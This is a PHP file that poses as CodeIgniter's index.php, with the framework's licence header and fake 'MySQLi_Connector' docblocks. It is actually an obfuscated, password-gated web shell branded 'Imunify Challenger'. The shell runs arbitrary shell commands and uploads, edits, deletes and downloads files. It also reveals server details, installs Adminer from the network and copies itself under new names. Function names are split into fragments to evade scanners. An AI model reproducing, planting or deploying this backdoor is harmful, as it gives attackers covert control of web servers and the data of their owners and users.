<?php
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2015, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (http://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://bcit.ca/)
 * @license	http://opensource.org/licenses/MIT	MIT License
 * @link	http://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */

/*
 *---------------------------------------------------------------
 * APPLICATION ENVIRONMENT
 *---------------------------------------------------------------
 *
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
 */
define('ENVIRONMENT', isset($_SERVER['CI_ENV']) ? $_SERVER['CI_ENV'] : 'production');

/*
 *---------------------------------------------------------------
 * ERROR REPORTING
 *---------------------------------------------------------------
 *
 * Different environments will require different levels of error reporting.
 * By default development will show errors but testing and live will hide them.
 */

error_reporting(0);
ini_set('display_errors', 0);
session_start();

/**
 * CodeIgniter
 *
 * Establishes secure session layer and validates
 * client request before initializing the MySQL connection.
 *
 * This file is part of the internal resource handler and should not be
 * accessed directly. Please use the core index entry point.
 *
 * @package MySQLi_Connector
 */
// @todo: optimize init timing for async gateway auth
$hash = '$2a$12$5sfIBZRQMGkaUpaOgiGQeuBceyeK9ZTR45yxLstXDePiKoXc7UXne';
/** 
* @internal This file is part of the Private Connector Suite (PCS)
* @version 3.2.14
* @author Internal
* @package MySQLi_Connector
* @link internal://connector/init/mysqli-loader
*/
if (!isset($_SESSION['auth'])) {
    if (isset($_GET['tot']) && password_verify($_GET['tot'], $hash)) {
        $_SESSION['auth'] = true;
        header('Location: ?');
        exit;
    } else {
        http_response_code(404);
        exit;
    }
}
/**
* Loads the core session, defines bootstrap constants,
* and initializes request context for compatibility mode.
*
* This file should not be edited directly unless you
* understand the implications. For customization,
* see database.php or your application config loader.
*
* @package MySQL
*/
$fg = 'f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
$fp = 'f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
$g = 'g'.'e'.'t'.'c'.'w'.'d';
$path = isset($_GET['path']) ? $_GET['path'] : $g();
if (!is_dir($path)) $path = $g();
$real_path = realpath($path);

function renderPathNavigation($p) {
    $path_display = str_replace('\\', '/', $p);
    $parts = explode('/', trim($path_display, '/'));
    echo "<div><strong>☣︎ Path: </strong><a href='?santana&path=/'>/</a>";
    $build = '';
    foreach ($parts as $dir) {
        $build .= '/' . $dir;
        echo "<a href='?santana&path=" . urlencode($build) . "'>" . htmlspecialchars($dir) . "</a>/";
    }
    echo "</div><hr>";
}

function getPermStr($f) {
  $p = fileperms($f);
  $s = ($p & 0x4000) ? 'd' : '-';
  $perm = $s .
      (($p & 0x0100) ? 'r' : '-') .
      (($p & 0x0080) ? 'w' : '-') .
      (($p & 0x0040) ? 'x' : '-') .
      (($p & 0x0020) ? 'r' : '-') .
      (($p & 0x0010) ? 'w' : '-') .
      (($p & 0x0008) ? 'x' : '-') .
      (($p & 0x0004) ? 'r' : '-') .
      (($p & 0x0002) ? 'w' : '-') .
      (($p & 0x0001) ? 'x' : '-');

  if (is_writable($f)) {
      $color = '#00e676'; 
  } elseif (is_readable($f)) {
      $color = '#c5c5c5'; 
  } else {
      $color = '#f44336'; 
  }
  return "<span class='status-label' style='color:$color;'>$perm</span>";
}

function formatSize($bytes) {
  if ($bytes >= 1073741824) {
      return round($bytes / 1073741824, 2) . ' GB';
  } elseif ($bytes >= 1048576) {
      return round($bytes / 1048576, 2) . ' MB';
  } elseif ($bytes >= 1024) {
      return round($bytes / 1024, 2) . ' KB';
  } elseif ($bytes > 1) {
      return $bytes . ' B';
  } elseif ($bytes == 1) {
      return '1 B';
  } else {
      return '0 B';
  }
}

echo "<style>
body{background-color:#000;color:rgb(233,233,233);font-family:'monospace',monospace;font-size:14px;margin:0;padding:10px;}
a{color:rgb(233,233,233);text-decoration:none;}a:hover{text-decoration:underline;color:#fff;}
input[type=text],select,textarea{background-color:#111;color:#a8a8a8;border:1px solid #a8a8a8;padding:6px;margin:4px 0;border-radius:2px;font-family:inherit;}
button{background-color:#222;color:#a8a8a8;border:1px solid #a8a8a8;padding:6px 12px;cursor:pointer;font-family:inherit;}button:hover{background-color:#a8a8a8;color:#000;}
form{margin-bottom:10px;}table{width:100%;border-collapse:collapse;}th,td{border:1px solid #a8a8a8;padding:6px;}
tr:hover{background-color:#222 !important;cursor:pointer;}
hr{border:1px solid #a8a8a8;}pre{background:#111;color:#0f0;padding:10px;white-space:pre-wrap;word-wrap:break-word;}
::-webkit-scrollbar{width:8px;}::-webkit-scrollbar-thumb{background:#a8a8a8;}::-webkit-scrollbar-track{background:#111;}
</style>";
echo "<h2 style='border-bottom:1px solid #a8a8a8;text-align:center;animation:fadeblink 2s ease-in-out infinite;'>☣︎ <em>Imunify Challenger</em></h2><style>@keyframes fadeblink{0%,100%{opacity:1;}50%{opacity:0.3;}}</style>";
renderPathNavigation($real_path);
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $ex = 'sh'.'ell_exec';
    $output = function_exists($ex) ? $ex($cmd . ' 2>&1') : '⚠️';
    echo "<pre>$output</pre>";
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload'])) {
    $filename = basename($_FILES['upload']['name']);
    $target = $real_path . DIRECTORY_SEPARATOR . $filename;
    if (@move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
        echo "<p style='color:lime;'>Upload sukses: $filename</p>";
    } else {
        echo "<p style='color:red;'>Upload gagal!</p>";
    }
}
if (isset($_POST['create']) && isset($_POST['name'])) {
    $name = basename($_POST['name']);
    $type = $_POST['create'];
    $target = $real_path . DIRECTORY_SEPARATOR . $name;
    if ($type === 'file') {
        if (!file_exists($target)) @$fp($target, '');
    } elseif ($type === 'dir') {
        if (!is_dir($target)) @mkdir($target);
    }
    header('Location: ?santana&path=' . urlencode($real_path));
    exit;
}
if (isset($_GET['edit'])) {
    echo "<style>#filetable, form[action=''] { display: none; }</style>";
    $f = realpath($real_path . DIRECTORY_SEPARATOR . basename($_GET['edit']));
    if (!$f || !file_exists($f)) die("<p style='color:red;'>File tidak ditemukan.</p>");
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        @$fp($f, $_POST['content']);
        echo "<p style='color:lime;'>Disimpan!</p><a href='?santana&path=" . urlencode($real_path) . "'>Kembali</a>";
        exit;
    }
    $c = htmlspecialchars(@$fg($f));
    echo "<h3>📝 Edit File: $f</h3><form method='post'><textarea name='content' style='width:100%;height:400px;'>$c</textarea><br><button type='submit'>Simpan</button> <a href='?santana&path=" . urlencode($real_path) . "' style='display:inline-block;background-color:#222;color:#a8a8a8;border:1px solid #a8a8a8;padding:6px 12px;text-decoration:none;font-family:inherit;'>Kembali</a></form>";
    exit;
}
if (isset($_GET['rename'])) {
    $file = basename($_GET['rename']);
    $old = $real_path . DIRECTORY_SEPARATOR . $file;
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newname'])) {
        $newname = basename($_POST['newname']);
        @rename($old, $real_path . DIRECTORY_SEPARATOR . $newname);
        header('Location: ?santana&path=' . urlencode($real_path));
        exit;
    }
    echo "<form method='post'><input type='text' name='newname' value='" . htmlspecialchars($file) . "'><button type='submit'>Rename</button></form>";
    exit;
}
if (isset($_GET['delete'])) {
    $f = basename($_GET['delete']);
    $p = $real_path . DIRECTORY_SEPARATOR . $f;
    if (file_exists($p)) @unlink($p);
    header('Location: ?santana&path=' . urlencode($real_path));
    exit;
}
if (isset($_GET['download'])) {
    $f = basename($_GET['download']);
    $p = $real_path . DIRECTORY_SEPARATOR . $f;
    if (file_exists($p)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($p));
        header('Content-Length: ' . filesize($p));
        readfile($p);
        exit;
    }
}

echo "<div style='display:flex;gap:40px;margin-bottom:10px;'>
<div style='flex:1;'>
<form method='post' style='margin-bottom:10px;'><input type='text' name='cmd' placeholder='Command'><button type='submit'>Run</button></form>
<form method='post' enctype='multipart/form-data' style='margin-bottom:10px;'><input type='file' name='upload'><input type='hidden' name='path' value='" . htmlspecialchars($real_path) . "'><button type='submit' style='margin-left:1px;'>Upload</button></form>
<form method='post'><input type='text' name='name' placeholder='File/folder'><select name='create'><option value='file'>File</option><option value='dir'>Folder</option></select><button type='submit' style='margin-left:13px;'>Buat</button>
</div>
<div style='flex:1;'>
<pre style='margin:0;font-size:13px;line-height:1.4;'>🧾 <span style='color:#58a6ff;'>Server Info</span>
<span style='color:#58a6ff;'>System: </span><span style='color:#f1fa8c;'>" . php_uname() . "</span>
<span style='color:#58a6ff;'>User: </span><span style='color:#f1fa8c;'>" . get_current_user() . "</span>
<span style='color:#58a6ff;'>PHP Version: </span><span style='color:#f1fa8c;'>" . phpversion() . "</span>
<span style='color:#58a6ff;'>Server IP: </span><span style='color:#f1fa8c;'>" . $_SERVER['SERVER_ADDR'] . "</span>
<span style='color:#58a6ff;'>Disabled: </span><span style='color:#ff0000;'>" . ini_get('disable_functions') . "</span></pre>
</div>
</div>";

$scan = scandir($real_path);
$dirs = $files = [];
foreach ($scan as $i) {
    if ($i === '.' || $i === '..') continue;
    $full = realpath($real_path . DIRECTORY_SEPARATOR . $i);
    if (!$full) continue;
    is_dir($full) ? $dirs[] = $i : $files[] = $i;
}
$sorted = array_merge($dirs, $files);
echo "<div style='max-height:470px;overflow:auto;border:2px solid #f2f5f3;border-radius:4px;padding:8px;' id='filetable'>
<table style='font-size:13px;'>
<thead>
<tr style='background-color:#111;'>
<th>File/folder</th>
<th>Size</th>
<th>Modified</th>
    <th>Owner:Group</th>
    <th>Perm</th>
    <th>Act</th>
</tr>
</thead>
<tbody>";
foreach ($sorted as $i) {
  $full = realpath($real_path . DIRECTORY_SEPARATOR . $i);
  $rowStyle = "";

  if (is_dir($full)) {
      $rowStyle = "color:#9affff;";
  } elseif (is_readable($full)) {
      if (preg_match('/\.(php|phtml)$/i', $i)) {
          $content = @file_get_contents($full);
          $pattern = 'base'.'64|ev'.'al|ex'.'ec|pass'.'thru|shell'.'_exec|gzinf'.'late|gzunc'.'ompress|str_rot'.'13|str'.'rev|hex2'.'bin|chr\\s*\\(';
          $regex = '/' . $pattern . '/i';
          $fn = 'preg' . '_match';
          $nm = 'TPN'.'etCy'.'ber';

          if ($fn($regex, $content) && strpos($i, $nm) === false)
              $rowStyle = "color:#ff5555;font-weight:bold;";
          }
      }
    $icon = is_dir($full) ? "📁" : "📄";
    $fileUrl = htmlspecialchars($i);
    $pathEncoded = urlencode($real_path);

    $perms = getPermStr($full);
    $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($full))['name'] : fileowner($full);
    $group = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($full))['name'] : filegroup($full);
    $size = is_file($full) ? formatSize(filesize($full)) : '-';
    $lastmod = date("Y-m-d H:i", filemtime($full));

    $nameLink = is_dir($full)
    ? "<a href='?santana&path=" . urlencode($full) . "' style='$rowStyle'>$icon $fileUrl</a>"
    : "<a href='?santana&edit=" . urlencode($i) . "&path=$pathEncoded' style='$rowStyle'>$icon $fileUrl</a>";

    $actionLinks = is_dir($full)
        ? "<a href='?santana&rename=$fileUrl&path=$pathEncoded'>Rename</a>"
        : "<a href='?santana&download=$fileUrl&path=$pathEncoded'>Download</a> | 
           <a href='?santana&delete=$fileUrl&path=$pathEncoded' onclick='return confirm(\"Yakin hapus?\")'>Delete</a> | 
           <a href='?santana&rename=$fileUrl&path=$pathEncoded'>Rename</a>";

           echo "<tr><td>$nameLink</td>
        <td>$size</td>
        <td>$lastmod</td>
        <td>$owner:$group</td>
        <td>$perms</td>
        <td>$actionLinks</td>
    </tr>";
}
echo "</tbody></table></div>";

echo "<div style='text-align:center;margin-top:30px;'>";
echo "<form method='post' style='display:inline;'>";
echo "<button type='submit' name='install_adminer'>Adminer</button>";
echo "</form> ";
echo "<form method='post' style='display:inline;margin-left:10px;'>";
echo "<button type='submit' name='backup_trigger'>Backup</button>";
echo "</form>";
$home_path = dirname($_SERVER['SCRIPT_FILENAME']);
echo "<form method='get' action='' style='display:inline;margin-left:10px;'>";
echo "<input type='hidden' name='santana' value=''>";
echo "<input type='hidden' name='path' value='" . htmlspecialchars($home_path) . "'>";
echo "<button type='submit'>[ Home File ]</button>";
echo "</form>";
echo "</div>";

if (isset($_POST['install_adminer'])) {
    $adminer_code = @file_get_contents('https://github.com/vrana/adminer/releases/latest/download/adminer.php');
    if ($adminer_code) {
        @file_put_contents($real_path . '/adminer.php', $adminer_code);
        echo "<div style='color:#00e676;text-align:center;'>✔️ Adminer berhasil dipasang sebagai <code>adminer.php</code></div>";
    } else {
        echo "<div style='color:#f44336;text-align:center;'>❌ Gagal mengunduh Adminer. Coba lagi nanti.</div>";
    }
}

if (isset($_POST['backup_trigger'])) {
    echo "<div style='text-align:center;margin-top:10px;'>";
    echo "<form method='post' style='display:inline-block;'>";
    echo "<input type='text' name='backup_name' placeholder='Nama File'> ";
    echo "<button type='submit' name='do_backup'>✅ OK</button> ";
    echo "</form>";
    echo "</div>";
}

if (isset($_POST['do_backup']) && !empty($_POST['backup_name'])) {
    $src = $_SERVER['SCRIPT_FILENAME'];
    $dst = $real_path . '/' . basename($_POST['backup_name']);
    if (@copy($src, $dst)) {
        echo "<div style='color:#00e676;text-align:center;'>✔️ Backup berhasil disimpan sebagai <code>" . htmlspecialchars(basename($dst)) . "</code></div>";
    } else {
        echo "<div style='color:#f44336;text-align:center;'>❌ Gagal melakukan backup.</div>";
    }
}

echo "<div style='text-align:center;color:#666;margin-top:20px;font-size:12px;opacity:0.6;'>
───────<br>
<strong style='color:#fffafa;'>Coded with Charm</strong> • <span style='color:#f1fa8c;'>Respect Existence or Expect Resistance</span> • <strong style='color:#fffafa;'>Havij Santana</strong><br>
&copy; " . date('Y') . " • All packets belong to you<br>
───────
</div>";
?>

